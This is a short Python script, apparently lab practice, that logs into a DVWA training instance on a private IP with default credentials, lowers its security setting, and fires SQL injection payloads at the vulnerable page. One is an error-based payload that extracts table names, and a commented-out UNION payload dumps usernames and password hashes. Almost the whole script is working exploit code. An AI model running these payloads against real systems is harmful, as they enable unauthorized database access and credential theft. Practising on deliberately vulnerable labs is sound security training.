#!/usr/bin/env python

import requests,re
from bs4 import BeautifulSoup

s = requests.Session()

def dvwa_login():
    url = 'http://192.168.210.130/dvwa/login.php'
    params = {'username':'admin','password':'password','Login':'Login'}
    r = s.post(url,params)
    print("[+] Logged In.")
dvwa_login()

def dvwa_security():
    url = 'http://192.168.210.130/dvwa/security.php'
    params = {'security':'low','seclev_submit':'Submit'}
    r = s.post(url,params)
    print("[+] Security set to low.")
dvwa_security()

def sqli_low():
    url = 'http://192.168.210.130/dvwa/vulnerabilities/sqli/'
    #params = {'id':"1' union select 1,(select group_concat(0x0d,user,0x3a3a,password,0x3c62723e) from users)-- -",'Submit':'Submit#'}
    payload = "1'  OR 1 GROUP BY CONCAT_WS(0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),FLOOR(RAND(0)*2)) HAVING MIN(0) OR 1-- -"
    params = {'id':payload,'Submit':'Submit#'}
    r = s.get(url,params=params)
    html = r.text
    print(html)
sqli_low()
